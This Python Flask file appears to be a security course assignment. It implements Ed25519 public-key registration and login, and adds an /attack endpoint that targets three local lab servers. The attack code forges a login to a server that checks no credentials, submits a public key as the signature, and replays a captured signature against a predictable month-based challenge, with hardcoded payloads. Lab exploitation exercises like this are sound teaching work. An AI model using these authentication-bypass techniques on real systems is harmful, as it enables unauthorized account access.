#!/usr/bin/env python3
from flask import Flask, request, abort
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519
from cryptography.exceptions import InvalidSignature
import requests

app = Flask(__name__)

# Allowed users
ALLOWED_USERS = {'test1', 'test2', 'test3', 'test4', 'test5'}

# In-memory storage for registered users: maps uid -> Ed25519 public key object
registered_users = {}

@app.route('/register/<uid>', methods=['POST'])
def register(uid):
    # Verify that the uid is allowed.
    if uid not in ALLOWED_USERS:
        abort(403, description="User not allowed.")
    
    # Check if uid is already registered.
    if uid in registered_users:
        abort(409, description="User already registered.")
    
    # Instead of request.data, use get_data(as_text=True) to get the raw POST body.
    key_str = request.get_data(as_text=True).strip()
    if not key_str:
        # If still empty, log and abort.
        print(f"No key data received for uid '{uid}'.")
        abort(406, description="Invalid key format.")
    
    # Print for debugging purposes.
    print(f"Registering uid '{uid}' with key data: {key_str}")
    
    # Convert the string back to bytes for key parsing.
    public_key_data = key_str.encode('utf-8')
    
    try:
        # Parse the public key (expects OpenSSH format)
        public_key = serialization.load_ssh_public_key(public_key_data)
        # Ensure that the key is an Ed25519 key.
        if not isinstance(public_key, ed25519.Ed25519PublicKey):
            abort(400, description="Key is not of type Ed25519.")
    except Exception as e:
        print(f"Exception while parsing key for uid '{uid}': {e}")
        abort(406, description="Invalid key format.")
    
    # Save the public key for this uid.
    registered_users[uid] = public_key
    return "", 200


@app.route('/login/<uid>', methods=['POST'])
def login(uid):
    # Verify that uid is allowed.
    if uid not in ALLOWED_USERS:
        abort(403, description="User not allowed.")
    
    # Check if uid has been registered.
    if uid not in registered_users:
        abort(404, description="User not registered.")
    
    # Read the signature from the request body (binary data)
    signature = request.get_data()
    # Retrieve the stored public key.
    public_key = registered_users[uid]
    message = b"Authenticate"
    
    try:
        # Verify the signature for the fixed message "Authenticate".
        public_key.verify(signature, message)
        return "", 200
    except InvalidSignature:
        abort(401, description="Invalid signature.")
    except Exception as e:
        print(f"Exception during signature verification for uid '{uid}': {e}")
        abort(400, description="Error during signature verification.")

@app.route('/attack/<server_name>', methods=['POST'])
def attack(server_name):
    # Read any data from the request body (if needed for the attack)
    attack_data = request.get_data(as_text=True).strip()
    # Implement attack logic for the identified vulnerable server.
    if server_name == "server_1":
        # For server_1, we exploit the fact that its login endpoint does not verify credentials.
        target_url = "http://localhost:8001/login/test1"
        try:
            # Send a forged login request; the vulnerable server accepts any data.
            response = requests.post(target_url, data="forged data")
            # Check for a successful login (200 status and the message "Authentication successful")
            if response.status_code == 200 and "Authentication successful" in response.text:
                return "Attack was successful!", 200
            else:
                return "Attack failed!", 400
        except Exception as e:
            print(f"Error during attack on {server_name}: {e}")
            return "Attack failed!", 400
    elif server_name == "server_2":
        # For server_2, the vulnerability is that the login endpoint accepts the public key
        # as the "signature" without proper verification.
        # Here, we send the public key string (for test1) as the POST body.
        target_url = "http://localhost:8002/login/test1"
        # The vulnerable public key for test1 as hardcoded in server_2.py:
        payload = "ssh-ed25519 AAABC3NzaC1lZDI1NTE5AAAAIE7XpKeJZF/nkzvKEfGouFbyRdq0B5RvVQAuWJl4JrG5 sasuke@assignment4"
        try:
            response = requests.post(target_url, data=payload)
            if response.status_code == 200 and "Authentication successful" in response.text:
                return "Attack was successful!", 200
            else:
                return "Attack failed!", 400
        except Exception as e:
            print(f"Error during attack on {server_name}: {e}")
            return "Attack failed!", 400
    elif server_name == "server_3":
        # Attack for server_3: exploit replay vulnerability.
        # Vulnerability: server_3 uses a predictable, month-based message (e.g., "2025-03")
        # for verifying signatures. A captured valid signature for test1 remains valid for the entire month.
        target_url = "http://localhost:8003/login/test1"
        # Use a valid signature for test1 from server_3.txt (replay attack).
        payload = "4CDLg+B4MVuG/rkBmqtRDtGTarUvasgIp63berzp94l3O4iker8TjjV+bCToQwWHRT0NpDzTXSdvRR6gcFH0BQ=="
        try:
            response = requests.post(target_url, data=payload)
            if response.status_code == 200 and "Authentication successful" in response.text:
                return "Attack was successful!", 200
            else:
                return "Attack failed!", 400
        except Exception as e:
            print(f"Error during attack on {server_name}: {e}")
            return "Attack failed!", 400

    else:
        # For other servers, if no attack method is defined, the attack fails.
        return "Attack failed!", 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)
